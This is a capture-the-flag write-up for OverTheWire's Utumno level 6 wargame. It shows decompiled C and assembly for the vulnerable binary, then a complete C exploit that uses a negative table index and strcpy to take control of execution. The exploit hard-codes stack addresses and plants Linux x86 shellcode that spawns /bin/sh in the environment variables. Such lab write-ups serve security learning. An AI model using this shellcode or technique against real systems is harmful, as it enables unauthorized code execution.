# Overthewire Utumno Level 6 Writeup

This one took me sometime since I can not figure out what caused the space layout subtly different between real one and the one in gdb. I decide to get back to this when I have an idea.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v4; // [sp+1Ch] [bp-34h]@4
  int v5; // [sp+20h] [bp-30h]@10
  unsigned __int32 v6; // [sp+48h] [bp-8h]@7
  unsigned __int32 v7; // [sp+4Ch] [bp-4h]@7

  if ( argc <= 2 )
  {
    puts("Missing args");
    exit(1);
  }
  v4 = (char *)malloc(0x20u);
  if ( !v4 )
  {
    puts("Sorry, ran out of memory :-(");
    exit(1);
  }
  v7 = strtoul(argv[2], 0, 16);
  v6 = strtoul(argv[1], 0, 10);
  if ( (signed int)v6 > 10 )
  {
    puts("Illegal position in table, quitting..");
    exit(1);
  }
  *(&v5 + v6) = v7;
  strcpy(v4, argv[3]);
  printf("Table position %d has value %d\nDescription: %s\n", v6, *(&v5 + v6 * 4), v4); // IDA got this wrong, the original one does not multiply v6 with 4
  return 0;
}
```

The default configuration of Hex-Ray seems to mess up with types. After checking the assembly code I fixed the decompiled code.

```assembly
080485cf         mov        edx, dword [ss:esp+0x1c]
080485d3         mov        eax, dword [ss:esp+0x48]
080485d7         mov        eax, dword [ss:esp+eax*4+0x20] ; eax * 4 here
080485db         mov        dword [ss:esp+0xc], edx
080485df         mov        dword [ss:esp+0x8], eax
080485e3         mov        eax, dword [ss:esp+0x48]
080485e7         mov        dword [ss:esp+0x4], eax
080485eb         mov        dword [ss:esp], 0x80486e4                           ; "Table position %d has value %d\\nDescription: %s\\n", argument "format" for method printf@PLT
080485f2         call       printf@PLT
```

I have to exactly control the stack content to ensure that the layout of memory stays the same. So I used the exploit below:

```c
#include <unistd.h>

int main(){
        char *argv[5];
        argv[0]="/utumno/utumno6";
        argv[1]="-1";
        argv[2]="0xffffddec"; // Use gdb to find out the ebp
        argv[3]="\xa9\xdf\xff\xff"; // the shellcode address
        argv[4]=NULL;
        char *env[11];
        env[0]="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";
        env[1]=env[2]=env[3]=env[4]=env[5]=env[6]=env[7]=env[8]="";
        env[9]="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7\x85\x1e\xa1\xff";
        env[10]=NULL;
        execve("/utumno/utumno6",argv,env);
}
```

You know what to do next to get the flag.
